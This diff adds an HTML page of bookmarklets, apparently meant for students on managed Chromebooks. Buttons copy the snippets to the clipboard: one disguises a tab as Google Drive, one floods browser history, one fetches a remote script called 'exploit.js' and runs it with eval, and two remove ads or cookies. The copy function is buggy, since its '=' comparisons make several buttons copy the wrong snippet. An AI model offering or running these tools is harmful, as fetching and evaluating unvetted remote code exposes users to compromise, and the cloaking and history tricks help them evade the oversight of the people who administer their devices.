@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8"/>
+    <title>Glitch</title>
+    <link rel="stylesheet" href="../gbl.css"/>
+    <link rel="icon" type="image/png" href="../assets/favicon.png" />
+    <style>
+        body {
+            overflow: hidden;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+
+        #btn {
+            width: 300px;
+            height: 50px;
+            font-size: 20px;
+            background-color: #131313;
+            border-color: transparent;
+            color: white;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+
+
+    </style>
+</head>
+<body style="background-color: black; color: white; overflow: hidden;">
+    
+        <div style="text-align: center;">
+            <br>
+            <h1>Bookmarklets</h1>
+
+            <h2>Click on a button to copy the code! Then save it as a bookmark to use ( if your chromebook has it on )!</h2>
+            <hr>
+            <div class="main">
+
+                <button onclick="copy('Tab disguise')"id="btn">Tab Disguise</button>
+                <button onclick="copy('History Flooder')"id="btn">History Flooder</button>
+                <button onclick="copy('Extension Hub')"id="btn">Extension Hub</button>
+                <button onclick="copy('Adblocker')"id="btn">Ad Blocker</button>
+                <button onclick="copy('Cookie Remover')" id="btn">Cookie Remover</button>
+            </div>
+
+
+
+        </div>
+
+        <br>
+        <button style="position: fixed; bottom: 0px;" onclick="window.location.href = '../main.html'"id="btn">Back</button>
+
+        <script>
+            function copy(id) {
+                if (navigator.clipboard) {
+                    if (id == 'Tab disguise') {
+                        navigator.clipboard.writeText(`javascript:function gcloak() { var link = document.querySelector("link[rel*='icon']") || document.createElement('link');link.type = 'image/x-icon';link.rel = 'shortcut icon';link.href = 'https://www.pngall.com/wp-content/uploads/9/Google-Drive-Logo-Transparent-180x180.png';document.title = 'My Drive - Google Drive';console.log(document.title);document.getElementsByTagName('head')[0].appendChild(link) };gcloak();setInterval(gcloak, 1000);`);
+                    }
+                    if (id == 'History Flooder') {
+                        navigator.clipboard.writeText(`javascript:var num=prompt("History flood amount:");done=false;x=window.location.href;for (var i=1; i<=num; i++){history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){alert("History flood successful! "+window.location.href+" now appears in your history "+num+(num==1?" time.":" times."))}`);
+                    }
+                    if (id="Extension Hub"){
+                        navigator.clipboard.writeText(`javascript:void fetch(\`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js\`).then(d=>d.text()).then(eval);`);
+                    }
+             
+                    if (id="Adblocker") {
+                        navigator.clipboard.writeText(`javascript:(function(){    /* Ad-B-Gone: Bookmarklet that removes obnoxious ads from pages */    var selectors = [    /* By ID: */    '#sidebar-wrap', '#advert', '#xrail', '#middle-article-advert-container',    '#sponsored-recommendations', '#around-the-web', '#sponsored-recommendations',    '#taboola-content', '#taboola-below-taboola-native-thumbnails', '#inarticle_wrapper_div',    '#rc-row-container', '#ads', '#at-share-dock', '#at4-share', '#at4-follow', '#right-ads-rail',    'div#ad-interstitial', 'div#advert-article', 'div#ac-lre-player-ph',    /* By Class: */    '.ad', '.avert', '.avert__wrapper', '.middle-banner-ad', '.advertisement',    '.GoogleActiveViewClass', '.advert', '.cns-ads-stage', '.teads-inread', '.ad-banner',    '.ad-anchored', '.js_shelf_ads', '.ad-slot', '.antenna', '.xrail-content',    '.advertisement__leaderboard', '.ad-leaderboard', '.trc_rbox_outer', '.ks-recommended',    '.article-da', 'div.sponsored-stories-component', 'div.addthis-smartlayers',    'div.article-adsponsor', 'div.signin-prompt', 'div.article-bumper', 'div.video-placeholder',    'div.top-ad-container', 'div.header-ad', 'div.ad-unit', 'div.demo-block', 'div.OUTBRAIN',    'div.ob-widget', 'div.nwsrm-wrapper', 'div.announcementBar', 'div.partner-resources-block',    'div.arrow-down', 'div.m-ad', 'div.story-interrupt', 'div.taboola-recommended',    'div.ad-cluster-container', 'div.ctx-sidebar', 'div.incognito-modal', '.OUTBRAIN', '.subscribe-button',    '.ads9', '.leaderboards', '.GoogleActiveViewElement', '.mpu-container', '.ad-300x600', '.tf-ad-block',    '.sidebar-ads-holder-top', '.ads-one', '.FullPageModal__scroller',    '.content-ads-holder', '.widget-area', '.social-buttons', '.ac-player-ph',    /* Other: */    'script', 'iframe', 'video', 'aside#sponsored-recommendations', 'aside[role="banner"]', 'aside',    'amp-ad', 'span[id^=ad_is_]', 'div[class*="indianapolis-optin"]', 'div[id^=google_ads_iframe]',    'div[data-google-query-id]', 'section[data-response]', 'ins.adsbygoogle', 'div[data-google-query-id]',    'div[data-test-id="fullPageSignupModal"]', 'div[data-test-id="giftWrap"]' ];    for(let i in selectors) {        let nodesList = document.querySelectorAll(selectors[i]);        for(let i = 0; i < nodesList.length; i++) {            let el = nodesList[i];            if(el && el.parentNode)                el.parentNode.removeChild(el);        }    }})();`);
+                    }
+
+                    if (id="Cookie Remover") {
+                        navigator.clipboard.writeText(`javascript:void((function(){var a,b,c,e,f;f=0;a=document.cookie.split("; ");for(e=0;e<a.length&&a[e];e++){f++;for(b="."+location.host;b;b=b.replace(/^(?:%5C.|[^%5C.]+)/,"")){for(c=location.pathname;c;c=c.replace(/.$/,"")){document.cookie=(a[e]+"; domain="+b+"; path="+c+"; expires="+new Date((new Date()).getTime()-1e11).toGMTString());}}}alert("Expired "+f+" cookies");})())`);
+                    }
+   
+                }
+                else{
+                    alert("Turn on permission to copy to clipboard in site settings!");
+                }
+            }
+        </script>
+</body>
+</html>
